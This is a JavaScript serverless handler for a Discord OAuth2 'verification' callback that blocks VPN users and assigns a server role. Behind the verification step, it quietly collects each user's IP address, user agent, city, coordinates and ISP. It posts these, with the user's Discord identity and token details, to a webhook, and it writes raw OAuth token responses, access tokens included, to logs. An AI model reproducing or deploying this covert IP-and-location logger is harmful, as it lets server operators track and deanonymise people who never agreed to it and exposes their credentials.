export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Missing code");

  const {
    DISCORD_CLIENT_ID: client_id,
    DISCORD_CLIENT_SECRET: client_secret,
    DISCORD_BOT_TOKEN: bot_token,
    DISCORD_GUILD_ID: guild_id,
    DISCORD_ROLE_ID: role_id,
    DISCORD_WEBHOOK_URL: webhook_url,
    IPQUALITYSCORE_API_KEY: ipqs_key,
    VERCEL_URL
  } = process.env;

  if (!client_id || !client_secret || !bot_token || !guild_id || !role_id || !ipqs_key || !VERCEL_URL) {
    return res.status(500).send("Missing environment variables.");
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || "Unknown IP";
  const userAgent = req.headers['user-agent'] || "Unknown User Agent";

  // --- VPN / Proxy / TOR check ---
  let vpnDetected = false;
  try {
    const vpnRes = await fetch(`https://ipqualityscore.com/api/json/ip/${ipqs_key}/${ip}`);
    const vpnJson = await vpnRes.json();
    console.log("VPN Check:", vpnJson);
    if (vpnJson.proxy || vpnJson.vpn || vpnJson.tor) vpnDetected = true;
  } catch (e) {
    console.warn("VPN check failed:", e.message);
  }

  if (vpnDetected) return res.status(403).send("VPN: True\n\ndisable ur vpn. (anti alt)");

  // --- Discord OAuth2 Token Exchange ---
  let tokenData;
  try {
    const params = new URLSearchParams({
      client_id,
      client_secret,
      grant_type: "authorization_code",
      code,
      redirect_uri: `https://${VERCEL_URL}/api/callback`,
    });

    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params.toString(),
    });
    tokenData = await tokenRes.json();
    console.log("Token Response:", tokenData);

    if (!tokenData.access_token) return res.status(400).send("Failed to get access token.");
  } catch (e) {
    console.error("Token exchange error:", e);
    return res.status(500).send("OAuth2 token exchange failed.");
  }

  // --- Fetch Discord User Info ---
  let userData;
  try {
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    userData = await userRes.json();
    console.log("User Info:", userData);
  } catch (e) {
    console.error("Fetching user info failed:", e);
    return res.status(500).send("Failed to fetch user info.");
  }

  // --- Optional Geo Lookup ---
  let geoData = {};
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp`);
    const geoJson = await geoRes.json();
    if (geoJson.status === "success") geoData = geoJson;
    else geoData = { error: geoJson.message || "Unknown error" };
  } catch (geoErr) {
    geoData = { error: geoErr.message || "Fetch failed" };
  }

  // --- Assign Discord Role ---
  try {
    const addRoleRes = await fetch(
      `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
      { method: "PUT", headers: { Authorization: `Bot ${bot_token}` } }
    );
    if (!addRoleRes.ok) {
      const errText = await addRoleRes.text();
      console.error("Failed to add role:", errText);
      return res.status(500).send("Failed to assign role.");
    }
  } catch (e) {
    console.error("Role assignment error:", e);
    return res.status(500).send("Role assignment failed.");
  }

  // --- Send Webhook ---
  if (webhook_url) {
    try {
      const avatarUrl = userData.avatar
        ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
        : null;

      const geoFields = geoData.error
        ? [{ name: "Geo Lookup Error", value: geoData.error, inline: false }]
        : [
            { name: "Country", value: geoData.country || "N/A", inline: true },
            { name: "Region", value: geoData.regionName || "N/A", inline: true },
            { name: "City", value: geoData.city || "N/A", inline: true },
            { name: "Latitude", value: geoData.lat?.toString() || "N/A", inline: true },
            { name: "Longitude", value: geoData.lon?.toString() || "N/A", inline: true },
            { name: "Timezone", value: geoData.timezone || "N/A", inline: true },
            { name: "ISP", value: geoData.isp || "N/A", inline: false },
          ];

      await fetch(webhook_url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "New User Verified",
            color: 0x7289DA,
            thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
            fields: [
              { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
              { name: "User ID", value: userData.id, inline: true },
              { name: "IP Address", value: ip, inline: false },
              { name: "User Agent", value: userAgent, inline: false },
              { name: "Token Type", value: tokenData.token_type, inline: true },
              { name: "Scope", value: tokenData.scope, inline: true },
              { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true },
              ...geoFields,
            ],
            timestamp: new Date().toISOString(),
          }]
        }),
      });
    } catch (e) {
      console.warn("Webhook notification failed:", e.message);
    }
  }

  // --- Redirect user back to Discord server ---
  return res.redirect(`https://discord.com/channels/${guild_id}`);
}
